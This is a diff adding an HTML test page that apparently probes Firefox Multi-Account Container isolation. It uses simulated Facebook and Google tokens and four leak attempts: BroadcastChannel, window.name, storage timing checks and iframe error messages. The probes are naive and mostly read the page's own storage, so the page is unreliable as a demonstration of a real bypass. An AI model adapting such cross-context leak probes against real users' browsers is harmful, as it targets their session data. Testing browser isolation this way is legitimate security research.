@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Firefox Multi-Account Containers Test</title>
+    <style>
+        .container { 
+            padding: 20px; 
+            margin: 10px; 
+            border-radius: 8px;
+            border: 2px solid #ccc;
+        }
+        .facebook { background: #1877f2; color: white; }
+        .google { background: #4285f4; color: white; }
+        .mozilla { background: #000; color: white; }
+    </style>
+</head>
+<body>
+
+<h1>🔄 Firefox Container Isolation Bypass</h1>
+<p>Testing if we can leak data between containers</p>
+
+<div class="container facebook" id="fbContainer">
+    <h3>Facebook Container</h3>
+    <button onclick="simulateFBLogin()">Simulate Facebook Login</button>
+</div>
+
+<div class="container google" id="googleContainer">
+    <h3>Google Container</h3>
+    <button onclick="simulateGoogleLogin()">Simulate Google Login</button>
+</div>
+
+<div class="container mozilla" id="attackContainer">
+    <h3>🤖 Attack Container</h3>
+    <button onclick="startContainerAttack()">Attempt Container Bypass</button>
+    <div id="leakedData"></div>
+</div>
+
+<script>
+// Simulated data that would normally be isolated
+let facebookData = {
+    accessToken: 'fb_token_' + Math.random().toString(36).substr(2),
+    userId: '123456789',
+    email: 'user@example.com'
+};
+
+let googleData = {
+    oauthToken: 'ya29.' + Math.random().toString(36).substr(2, 40),
+    gmail: 'user@gmail.com'
+};
+
+function simulateFBLogin() {
+    document.getElementById('fbContainer').innerHTML += 
+        `<p>✅ Logged in as: ${facebookData.email}</p>`;
+    localStorage.setItem('fb_simulated_data', JSON.stringify(facebookData));
+}
+
+function simulateGoogleLogin() {
+    document.getElementById('googleContainer').innerHTML += 
+        `<p>✅ Logged in as: ${googleData.gmail}</p>`;
+    sessionStorage.setItem('google_simulated_data', JSON.stringify(googleData));
+}
+
+function startContainerAttack() {
+    const leakedDiv = document.getElementById('leakedData');
+    leakedDiv.innerHTML = '<h4>Attempting to leak data...</h4>';
+    
+    // Technique 1: BroadcastChannel (might bypass some isolation)
+    try {
+        const channel = new BroadcastChannel('cross_container_leak');
+        channel.postMessage({
+            type: 'REQUEST_DATA',
+            from: 'attack_container'
+        });
+        
+        channel.onmessage = (e) => {
+            if(e.data && e.data.type === 'LEAKED_DATA') {
+                leakedDiv.innerHTML += `<p style="color:red">⚠️ DATA LEAKED via BroadcastChannel:</p>`;
+                leakedDiv.innerHTML += `<pre>${JSON.stringify(e.data.payload, null, 2)}</pre>`;
+            }
+        };
+        
+        leakedDiv.innerHTML += '<p>BroadcastChannel created</p>';
+    } catch(e) {
+        leakedDiv.innerHTML += `<p>BroadcastChannel blocked: ${e.message}</p>`;
+    }
+    
+    // Technique 2: window.name attack (legacy but might work)
+    setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.name = JSON.stringify({
+            attempt: 'container_bypass',
+            timestamp: Date.now()
+        });
+        document.body.appendChild(iframe);
+        
+        leakedDiv.innerHTML += '<p>window.name manipulation attempted</p>';
+        
+        // Clean up
+        setTimeout(() => document.body.removeChild(iframe), 1000);
+    }, 1000);
+    
+    // Technique 3: Performance timing attack
+    setTimeout(() => {
+        const start = performance.now();
+        
+        // Try to access isolated resources
+        const tests = [
+            () => localStorage.getItem('fb_simulated_data'),
+            () => sessionStorage.getItem('google_simulated_data'),
+            () => document.cookie.includes('facebook'),
+            () => document.cookie.includes('google')
+        ];
+        
+        tests.forEach(test => {
+            const testStart = performance.now();
+            try {
+                test();
+            } catch(e) {}
+            const duration = performance.now() - testStart;
+            
+            if(duration > 5) {
+                leakedDiv.innerHTML += `<p style="color:orange">⚠️ Timing difference detected (${duration.toFixed(2)}ms)</p>`;
+            }
+        });
+    }, 1500);
+    
+    // Technique 4: Error-based information leak
+    setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.srcdoc = `
+            <script>
+                try {
+                    // Try to access parent's localStorage
+                    window.parent.localStorage.getItem('test');
+                } catch(e) {
+                    // Error message might contain information
+                    window.parent.postMessage({
+                        type: 'ERROR_INFO',
+                        error: e.toString()
+                    }, '*');
+                }
+            <\/script>
+        `;
+        document.body.appendChild(iframe);
+        
+        window.addEventListener('message', (e) => {
+            if(e.data && e.data.type === 'ERROR_INFO') {
+                leakedDiv.innerHTML += `<p>Error info: ${e.data.error.substring(0, 100)}...</p>`;
+            }
+        });
+        
+        setTimeout(() => document.body.removeChild(iframe), 1000);
+    }, 2000);
+}
+</script>
+</body>
+</html>
